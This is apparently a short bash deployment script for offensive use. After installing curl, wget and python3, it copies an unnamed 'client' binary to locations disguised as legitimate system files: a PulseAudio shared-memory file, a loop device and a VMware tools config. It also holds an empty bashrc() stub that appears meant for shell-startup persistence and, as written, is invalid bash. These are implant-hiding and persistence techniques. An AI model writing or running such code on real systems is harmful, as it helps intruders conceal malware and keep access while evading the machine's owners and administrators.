#!/bin/bash

# Setup tools for basic deployment 
setup(){
    #yum install -y 
    apt-get install -y curl wget vim python3
}

clone(){
    cp client /dev/shm/pulse-shm-401862937
    cp client /dev/loop17
    cp client /etc/vmwaretools.conf

}

bashrc(){
    
}

